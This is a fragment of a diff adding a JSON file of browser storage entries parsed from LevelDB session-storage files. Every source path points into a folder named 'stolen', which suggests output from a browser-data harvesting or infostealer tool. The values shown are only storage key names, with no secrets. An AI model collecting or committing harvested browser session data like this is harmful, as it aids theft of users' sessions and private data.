+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4153-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4156-sentryReplaySession0",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000464.log",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000464.log"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000465.ldb",
+      "Value": "map-4129-gapi.sessionStorageTest",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000465.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000465.ldb",
+      "Value": "sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000465.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000465.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000465.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000465.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000465.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000465.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000465.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000465.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000465.ldb"
+    },
+    {
+      "Host Name": "Unknown (LevelDB)",
+      "Path": "/",
+      "Name": "Session Storage_000465.ldb",
+      "Value": "map-4156-sentryReplaySession",
+      "Secure": "Unknown",
+      "HTTP Only": "Unknown",
+      "Source File": "stolen/Session Storage_000465.ldb"
+    }
+  ]
+}
